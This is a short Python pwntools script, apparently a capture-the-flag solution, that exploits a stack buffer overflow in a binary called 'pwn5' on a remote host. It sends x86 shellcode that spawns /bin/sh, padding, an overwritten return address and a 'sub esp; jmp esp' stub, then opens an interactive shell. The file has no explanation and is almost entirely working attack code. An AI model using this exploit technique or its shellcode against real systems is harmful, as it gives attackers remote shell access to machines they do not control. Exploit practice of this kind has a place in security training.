#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./pwn5')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elif debug == 0:
    p = remote('117.139.247.14', 9337)
    # libc = ELF('./', checksec=False)
elf = ELF('./pwn5', checksec=False)

# gdb.attach(p, "b *0x08048550\nc")
shellcode_x86 = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

pd = shellcode_x86
pd = pd.ljust(0x24, '\x00')
pd += p32(0x08048554)
pd += asm("sub esp,0x28;jmp esp;")
p.sendlineafter('>\n', pd)
p.interactive()
